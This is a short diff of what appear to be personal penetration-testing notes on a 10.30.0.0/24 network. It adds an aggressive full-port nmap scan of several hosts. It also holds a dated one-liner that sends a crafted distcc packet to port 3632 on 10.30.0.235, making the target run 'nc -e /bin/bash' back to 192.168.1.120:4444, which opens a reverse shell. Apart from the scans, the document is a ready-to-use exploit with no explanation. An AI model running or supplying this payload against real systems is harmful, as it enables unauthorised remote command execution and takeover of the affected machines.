@@ -26,6 +26,9 @@ sudo nmap -sn 10.30.0.0/24
 sudo nmap -sn 10.30.0.0/24 | grep "Nmap scan report for" | awk '{print $5}'
 
 
+sudo nmap -Pn -p- --min-rate 2000 -sS -sV -O -v -oA deep_scan_results 10.30.0.1,109,235,236,237,250
+
+
 
 20/05/2026:
 printf "DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV00000031nc -e /bin/bash 192.168.1.120 4444ARGD00000001X" | nc -nv 10.30.0.235 3632
